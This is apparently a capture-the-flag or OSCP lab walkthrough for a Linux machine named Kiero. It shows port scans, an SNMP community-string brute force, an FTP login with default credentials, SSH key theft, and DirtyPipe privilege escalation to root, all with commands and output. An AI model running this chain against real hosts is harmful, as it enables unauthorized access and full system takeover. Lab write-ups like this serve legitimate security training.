##### Tags: `snmp`  `id_rsa`  `DirtyPipe` 

# 🐧OSCP-B (Kiero)🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.152.149
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is default page with no endpoint found  
try udp scan and found port 161 snmp
```console
$ nmap -sV --top-port 100 -sU 192.168.152.149

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: oscp
```
brute force found public
```console
$ hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.152.149

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-14 19:40:10
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://192.168.152.149:161/
[161][snmp] host: 192.168.152.149   password: public
[STATUS] attack finished for 192.168.152.149 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
found 2 users john and kiero
```console
$ snmpwalk -v2c -c public 192.168.152.149
iso.3.6.1.4.1.8072.1.3.2.2.1.2.5.82.69.83.69.84 = STRING: "./home/john/RESET_PASSWD"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.5.82.69.83.69.84 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.4.5.82.69.83.69.84 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.5.5.82.69.83.69.84 = INTEGER: 5
iso.3.6.1.4.1.8072.1.3.2.2.1.6.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.7.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.20.5.82.69.83.69.84 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.21.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.3.1.1.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
```
ftp kiero:kiero logged in successfully  
found id_rsa
```console
$ ftp 192.168.152.149

Name (192.168.152.149:ming): kiero
331 Please specify the password.
Password: kiero
230 Login successful.

ftp> pwd
Remote directory: /srv/ftp

ftp> ls
229 Entering Extended Passive Mode (|||10090|)
150 Here comes the directory listing.
-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
```
set 600 permission for both key
```console
$ chmod 600 id_rsa 
$ chmod 600 id_rsa_2
```
one of the id_rsa logged in as john
```console
$ ssh john@192.168.152.149 -i id_rsa
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
```
run linpeas and found it is [CVE-2022-0847] DirtyPipe
```console
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
```
found the exploit on github
```console
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
```
upload compile.sh and exploit-1
run it and got the root shell
```console
john@oscp:~$ chmod +x compile.sh
john@oscp:~$ ./compile.sh
john@oscp:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id
uid=0(root) gid=0(root) groups=0(root)
```
